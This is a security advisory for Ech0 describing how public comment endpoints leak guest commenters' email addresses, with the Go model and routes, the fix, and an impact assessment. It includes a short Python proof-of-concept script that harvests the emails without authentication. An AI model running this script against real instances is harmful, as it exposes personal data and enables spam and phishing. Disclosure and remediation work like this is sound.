# [M] Ech0 comment model's Email field returned on public /api/comments endpoints

## Summary
Severity: Medium
Advisory: GHSA-rj4g-rqgh-rx9h
CWE: CWE-200, CWE-359
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-rj4g-rqgh-rx9h
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/Ech0` — affected >=0 <1.4.8-0.20260503034700-cb8d7a997dd8

## Details
## Summary

The `Comment` model serializes its `Email` field through the public comment-listing API. `internal/model/comment/comment.go:33` uses `json:"email"`, while adjacent PII fields (`IPHash`, `UserAgent`) correctly use `json:"-"`. The public endpoints `GET /api/comments?echo_id=X` and `GET /api/comments/public?limit=N` both live on `PublicRouterGroup` with no authentication. Alice retrieves every guest commenter's email address on the instance with a few unauthenticated HTTP calls.

## Details

The Comment model at `internal/model/comment/comment.go:33`:

```go
type Comment struct {
    // ... 
    Email     string     `gorm:"size:255;not null;index" json:"email"`
    IPHash    string     `gorm:"size:128;index"          json:"-"`
    UserAgent string     `gorm:"size:512"                json:"-"`
    // ...
}
```

The `json:"-"` on `IPHash` and `UserAgent` shows the developer's intent: hide server-side PII from API responses. The `Email` field missed the same tag. GORM materializes the full struct and the Gin handler returns it verbatim.

Routes at `internal/router/comment.go:20` and comment public-feed route:

```go
appRouterGroup.PublicRouterGroup.GET("/comments", middleware.NoCache(), h.CommentHandler.ListCommentsByEchoID())
appRouterGroup.PublicRouterGroup.GET("/comments/public", middleware.NoCache(), h.CommentHandler.ListPublicComments())
```

Both handlers call `ListPublicByEchoID` (service at `internal/service/comment/comment.go:329`) or `ListPublicComments` (service at `:340`), both of which return the slice of `Comment` structs to `ctx.JSON`. No DTO projection, no field stripping.

The email field is populated for every guest comment: the submission form requires an email address so the server can later send moderation or reply notifications. The UI does not display the email, so users assume it stays server-side.

GHSA-m983-7426-5hrj (2026-03-22) closed a similar PII leak on `GET /api/allusers`, which exposed account-owner emails. This report covers a distinct endpoint (`/api/comments` and `/api/comments/public`) and a distinct data subject (guest commenters, not registered account owners).

## Proof of Concept

Anonymous caller harvests commenter emails on the default install:

```python
import requests
TARGET = "http://localhost:8300"

# Any echo UUID from the public feed.
pub_id = requests.get(f"{TARGET}/api/echo/page?page=1&pageSize=1").json()["data"]["items"][0]["id"]

# No auth header. The response includes the raw email field.
r = requests.get(f"{TARGET}/api/comments", params={"echo_id": pub_id})
for c in r.json()["data"]:
    print(f"  nickname={c['nickname']!r}  email={c.get('email')!r}")

# The /public variant returns recent comments across every echo.
r = requests.get(f"{TARGET}/api/comments/public", params={"limit": 100})
emails = {c.get("email") for c in r.json()["data"] if c.get("email")}
print(f"harvested {len(emails)} unique emails from /comments/public")
```

Observed on v4.5.6:

```
nickname='GuestHarvestMe'  email='leaked-harvest-target@example.com'
harvested 1 unique emails from /comments/public
```

The instance had one guest comment; its email returned in both endpoints. An instance with any commenter volume returns every address.

## Impact

Anonymous harvest of every guest commenter's email address across the instance. Email addresses submitted for moderation or reply notifications are treated as private by user expectation; any visitor pulls the full list with a short paginated loop against `/api/comments/public`. Privacy-regulation exposure follows:

- **GDPR and CCPA.** Email is personal data. Exposing it to any internet visitor without consent is a notifiable incident under both regimes.
- **Spam and phishing targeting.** Attackers map commenter emails to nicknames and per-echo topics, then send targeted phishing that references content the victim engaged with.
- **Cross-instance aggregation.** A scraper against any public-facing Ech0 instance yields a curated list of people who comment on the topics the site covers.

No authentication required. No admin role required. The `/comments/public` endpoint returns cross-echo aggregated data, so one call covers the whole instance.

## Recommended Fix

Change the JSON tag on the Email field to match the adjacent PII fields:

```go
Email string `gorm:"size:255;not null;index" json:"-"`
```

Or, if some authenticated view needs the email, introduce a `PublicComment` DTO that projects only non-sensitive fields:

```go
type PublicComment struct {
    ID        string    `json:"id"`
    EchoID    string    `json:"echo_id"`
    Nickname  string    `json:"nickname"`
    Website   string    `json:"website,omitempty"`
    Content   string    `json:"content"`
    Status    string    `json:"status"`
    Hot       bool      `json:"hot"`
    Source    string    `json:"source"`
    CreatedAt int64     `json:"created_at"`
    UpdatedAt int64     `json:"updated_at"`
}
```

Project the handler output through this DTO. Keep the raw `Comment` struct internal to the service layer.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-rj4g-rqgh-rx9h
- https://github.com/lin-snow/Ech0/commit/cb8d7a997dd8f573ef0e22e4e6b23b2b8ee92ebd
- https://github.com/lin-snow/Ech0
